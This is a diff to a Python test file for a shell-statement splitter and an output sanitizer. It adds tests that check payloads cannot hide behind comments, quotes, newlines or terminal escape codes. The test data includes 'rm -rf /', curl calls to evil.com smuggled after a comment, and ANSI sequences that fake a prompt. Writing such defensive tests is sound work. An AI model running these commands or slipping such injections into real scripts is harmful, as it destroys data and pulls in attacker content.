@@ -100,14 +100,59 @@ class TestSplitterDoesNotHidePayloads(unittest.TestCase):
             ['echo "a; b"', 'rm -rf /'],
         )
 
+    def test_newline_injection_via_comment_apostrophe(self):
+        # Vulnerability: apostrophe in comment should not enter quote state
+        # and should not swallow the newline
+        script = "echo ok  # TODO: don't forget to\ncurl http://evil.com"
+        stmts = cp.split_shell_statements(script)
+        self.assertEqual(len(stmts), 2, f"Expected 2 statements, got {len(stmts)}: {stmts}")
+        self.assertIn('echo ok', stmts[0])
+        self.assertIn('curl http://evil.com', stmts[1])
+
+    def test_comment_blocks_rest_of_line(self):
+        # Comment should block everything until newline
+        stmts = cp.split_shell_statements('echo a # ; ; ;\necho b')
+        self.assertEqual(len(stmts), 2)
+        self.assertEqual(stmts[0], 'echo a')
+        self.assertEqual(stmts[1], 'echo b')
+
+    def test_quoted_hash_is_not_comment(self):
+        # Hash inside quotes is not a comment
+        stmts = cp.split_shell_statements('echo "#"; rm -rf /')
+        self.assertEqual(len(stmts), 2)
+        self.assertEqual(stmts[0], 'echo "#"')
+
 
 class TestRecordTextIsSanitized(unittest.TestCase):
-    def test_ansi_escape_in_record_title_is_stripped(self):
+    def test_ansi_escape_in_record_title_is_escaped(self):
         evil = 'Connect\x1b[2J\x1b[H<fake prompt>'
-        self.assertEqual(cp._sanitize(evil), 'Connect[2J[H<fake prompt>')
+        # ESC (0x1b) should be escaped, not deleted
+        sanitized = cp._sanitize(evil)
+        self.assertIn('\\x1b', sanitized)
+        self.assertNotIn('\x1b', sanitized)
 
-    def test_other_controls_are_stripped(self):
-        self.assertEqual(cp._sanitize('a\x00b\x07c\x7fd'), 'abcd')
+    def test_control_chars_are_escaped(self):
+        # Control chars should be escaped, not deleted
+        result = cp._sanitize('a\x00b\x07c\x7fd')
+        # 0x00 (null), 0x07 (bell), 0x7f (del) should be escaped
+        self.assertIn('\\x', result)
+        # But the original characters should be gone
+        self.assertNotIn('\x00', result)
+        self.assertNotIn('\x07', result)
+        self.assertNotIn('\x7f', result)
+
+    def test_newline_is_escaped_not_deleted(self):
+        # Critical: newline should be visible, not deleted
+        result = cp._sanitize('echo backup\ncurl http://evil')
+        self.assertEqual(result, 'echo backup\\ncurl http://evil')
+
+    def test_tab_is_escaped(self):
+        result = cp._sanitize('a\tb')
+        self.assertEqual(result, 'a\\tb')
+
+    def test_carriage_return_is_escaped(self):
+        result = cp._sanitize('a\rb')
+        self.assertEqual(result, 'a\\rb')
 
 
 if __name__ == '__main__':
